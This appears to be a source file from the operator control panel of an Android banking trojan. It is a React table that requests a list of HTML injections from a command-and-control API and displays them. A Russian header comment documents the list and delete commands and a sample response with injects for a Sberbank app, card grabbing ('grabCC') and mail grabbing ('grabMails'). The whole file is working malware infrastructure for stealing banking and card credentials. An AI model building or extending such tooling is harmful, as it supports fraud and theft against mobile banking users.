import React from 'react';
import InjectRow from './InjectRow';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
/*
    22) '{"request":"getHtmlInjection"}' // Лист всех инжектов
    24) '{"request":"deleteHtmlInjection","app":""}' Удалить инжект
        

{"dataInjections":[{"app":"ru.sberbankmobile","html":"1","icon":"0"},{"app":"grabCC","html":"1","icon":"0"},{"app":"grabMails","html":"1","icon":"0"}]} 
*/
class InjectTable extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
          error: null,
          isLoaded: false,
          InjectList: []
        };
    }

    componentDidMount() {
        this.onLoadJson();
    }

    componentWillReceiveProps() {
        this.onLoadJson();
    }

    async onLoadJson () {
        while(isNullOrUndefined(SettingsContext.restApiUrl)) await SettingsContext.sleep(500);
        while(SettingsContext.restApiUrl.length < 15) await SettingsContext.sleep(500);
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"getHtmlInjection"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                }
                else {
                    this.setState({
                        isLoaded: true,
                        InjectList: result.dataInjections
                    });
                }
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading injects. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () { 
        const Px70Width = {
            width: '70px',
            textAlign: 'center'
        }
        if (!this.state.isLoaded) {
            return <div class="loading">Loading</div>;
        }
        return (
            <React.Fragment>
                <table class="table table-striped table-hover animated fadeIn">
                    <thead class="thead-light">
                        <tr>
                        <th scope="col">App name</th>
                        <th scope="col" style={Px70Width}>HTML</th>
                        <th scope="col" style={Px70Width}>ICON</th>
                        <th scope="col" style={Px70Width}></th>
                        </tr>
                    </thead>
                    <tbody>
                        {this.state.InjectList.map(item => (
                        <InjectRow InjListForceUpdate={this.props.InjListForceUpdate} app={item.app} html={item.html} icon={item.icon}/>
                        ))}
                    </tbody>
                </table>
            </React.Fragment>
        );
    }

}

export default InjectTable;